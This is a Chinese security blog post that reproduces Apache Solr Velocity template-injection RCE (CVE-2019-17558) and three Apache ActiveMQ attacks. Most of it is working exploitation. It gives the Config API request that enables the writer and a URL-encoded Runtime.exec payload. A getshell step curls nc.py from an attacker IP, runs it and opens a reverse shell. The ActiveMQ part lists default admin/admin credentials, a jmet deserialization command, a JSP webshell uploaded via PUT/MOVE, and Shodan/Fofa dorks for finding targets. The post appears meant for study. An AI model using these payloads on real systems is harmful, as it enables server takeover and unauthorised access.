---
layout: post
toc: true
title: "「漏洞复现」:Apache-Solr & ActiveMQ RCE漏洞复现"
wrench: 2020-08-25
author: Bin4xin
categories:
    - blog
    - 笔记
    - CVE
    - 漏洞复现
    - Java
permalink: /blog/2020/Apache/vuln-Cve/
---

> 本文记录Apache组件的两个RCE漏洞复现：Apache Solr Velocity模板注入RCE（CVE-2019-17558）和Apache ActiveMQ未授权访问漏洞。

## 0x00 Apache Solr Velocity模板注入RCE

> **CVE编号**：CVE-2019-17558
>
> **影响版本**：`Apache Solr 5.0.0 ~ 8.3.1`
>
> **漏洞原理**：通过Solr Config API启用`VelocityResponseWriter`组件，利用Velocity模板注入实现远程代码执行

### 漏洞分析

Solr默认集成VelocityResponseWriter组件，但在`solrconfig.xml`中未默认启用。当攻击者能够通过Config API动态修改配置时，可以启用该组件，进而利用Velocity模板语法执行任意Java代码。

### Step 1：获取Solr Core名称

首先通过Solr Admin API获取Core名称，这是利用的前提条件：

```bash
curl "http://<target>:8983/solr/admin/cores?indexInfo=false&wt=json"
```

```json
{
  "responseHeader": {
    "status": 0,
    "QTime": 0
  },
  "initFailures": {},
  "status": {
    "demo": {
      "name": "demo",
      "instanceDir": "/var/solr/data/demo",
      "dataDir": "/var/solr/data/demo/data/",
      "config": "solrconfig.xml",
      "schema": "managed-schema",
      "startTime": "2020-08-22T01:42:03.422Z",
      "uptime": 51628
    }
  }
}
```

Core名称为`demo`。

### Step 2：启用Velocity模板引擎

通过Config API动态启用VelocityResponseWriter：

```bash
POST /solr/demo/config HTTP/1.1
Host: <target>:8983
Content-Type: application/json
Content-Length: 259

{
  "update-queryresponsewriter": {
    "startup": "lazy",
    "name": "velocity",
    "class": "solr.VelocityResponseWriter",
    "template.base.dir": "",
    "solr.resource.loader.enabled": "true",
    "params.resource.loader.enabled": "true"
  }
}
```

返回`200 OK`表示配置成功：

```json
{
  "responseHeader": {
    "status": 0,
    "QTime": 425
  },
  "WARNING": "This response format is experimental. It is likely to change in the future."
}
```

> **关键配置**：`params.resource.loader.enabled`设为`true`后，允许通过URL参数直接传入Velocity模板内容。

### Step 3：RCE Payload

启用Velocity后，通过Solr查询接口的`v.template.custom`参数注入Velocity模板执行命令：

```
GET /solr/<core>/select?wt=velocity&v.template=custom&v.template.custom=
#set($x='')
#set($rt=$x.class.forName('java.lang.Runtime'))
#set($chr=$x.class.forName('java.lang.Character'))
#set($str=$x.class.forName('java.lang.String'))
#set($ex=$rt.getRuntime().exec('id'))
$ex.waitFor()
#set($out=$ex.getInputStream())
#foreach($i in [1..$out.available()])
$str.valueOf($chr.toChars($out.read()))
#end
```

URL编码后的Payload：

```bash
/solr/<core>/select?wt=velocity&v.template=custom&v.template.custom=%23set($x=%27%27)+%23set($rt=$x.class.forName(%27java.lang.Runtime%27))+%23set($chr=$x.class.forName(%27java.lang.Character%27))+%23set($str=$x.class.forName(%27java.lang.String%27))+%23set($ex=$rt.getRuntime().exec(%27id%27))+$ex.waitFor()+%23set($out=$ex.getInputStream())+%23foreach($i+in+[1..$out.available()])$str.valueOf($chr.toChars($out.read()))%23end
```

> **执行流程**：
> 1. Velocity模板中通过`$x.class.forName()`反射获取`Runtime`类
> 2. 调用`getRuntime().exec('cmd')`执行系统命令
> 3. 读取命令输出的InputStream并通过`Character.toChars()`转换为可读字符

### Step 4：GetShell

下载反弹Shell脚本到目标服务器，然后执行：

```bash
# 1. 下载反弹Shell脚本
/solr/<core>/select?wt=velocity&v.template=custom&v.template.custom=...exec('curl%20-o%20/tmp/nc.py%20http://<attack_ip>:8000/nc.py')...

# 2. 执行反弹Shell
/solr/<core>/select?wt=velocity&v.template=custom&v.template.custom=...exec('python%20/tmp/nc.py')...
```

攻击机监听：

```bash
nc -lvnp 4444
```

> **注意**：如果存在Basic Auth认证，需要先通过认证才能访问Config API和查询接口。

## 0x01 Apache ActiveMQ漏洞

### 探测

通过nmap扫描识别ActiveMQ服务：

```bash
nmap -sV -p 8161 <target_ip>

PORT     STATE SERVICE VERSION
8161/tcp open  http    Jetty 8.1.16.v20140903
|_http-server-header: Jetty(8.1.16.v20140903)
|_http-title: Apache ActiveMQ
```

ActiveMQ管理控制台默认端口为`8161`，默认账号密码为`admin/admin`。

### 常见利用方式

#### 方式一：默认凭据

```bash
# 访问管理控制台
http://<target>:8161/admin/

# 默认凭据
# 用户名: admin
# 密码: admin
```

#### 方式二：CVE-2015-5254（反序列化漏洞）

影响版本：Apache ActiveMQ 5.0.0 ~ 5.13.0

利用JMS消息的反序列化特性，通过发送恶意序列化对象执行命令：

```bash
# 使用jmet工具发送恶意消息
java -jar jmet-0.1.0-all.jar -Q event -I ActiveMQ -s -Y "whoami" -Yp ROME <target> 61616

# 访问管理页面触发反序列化
http://<target>:8161/admin/browse.jsp?JMSDestination=event
```

#### 方式三：CVE-2016-3088（文件上传漏洞）

影响版本：Apache ActiveMQ 5.0.0 ~ 5.13.2

通过Fileserver接口上传WebShell：

```bash
# 上传JSP文件
PUT /fileserver/shell.txt HTTP/1.1
Host: <target>:8161
Authorization: Basic YWRtaW46YWRtaW4=
Content-Length: <length>

<%Runtime.getRuntime().exec(request.getParameter("cmd"));%>

# 移动到Web目录
MOVE /fileserver/shell.txt HTTP/1.1
Host: <target>:8161
Authorization: Basic YWRtaW46YWRtaW4=
Destination: file:///opt/activemq/webapps/admin/shell.jsp
```

### 挖掘技巧

在SRC挖掘中，可以通过以下方式发现ActiveMQ实例：

```bash
# Shodan搜索
http.title:"Apache ActiveMQ" country:CN

# Fofa搜索
title="Apache ActiveMQ"

# 默认端口
# 61616: STOMP/JMS服务端口
# 8161:  管理控制台Web端口
```

## 0x02 知识点总结

{:.table}
| 漏洞 | CVE | 影响组件 | 利用条件 |
|------|-----|----------|----------|
| Solr Velocity SSTI | CVE-2019-17558 | Solr 5.0~8.3.1 | 可访问Config API |
| ActiveMQ反序列化 | CVE-2015-5254 | ActiveMQ 5.0~5.13.0 | 可发送JMS消息 |
| ActiveMQ文件上传 | CVE-2016-3088 | ActiveMQ 5.0~5.13.2 | 知道默认凭据 |

## 参考

- [CVE-2019-17558 - Apache Solr Velocity RCE](https://issues.apache.org/jira/browse/SOLR-13971){:target="_blank"}
- [Apache ActiveMQ反序列化漏洞](https://github.com/matthiaskaiser/jmet){:target="_blank"}
- [CVE-2016-3088 - ActiveMQ Fileserver](https://activemq.apache.org/security-advisories.data/CVE-2016-3088-announcement.txt){:target="_blank"}
- [Solr RCE via Velocity Template](https://github.com/veracode-research/solr-injection){:target="_blank"}

以上。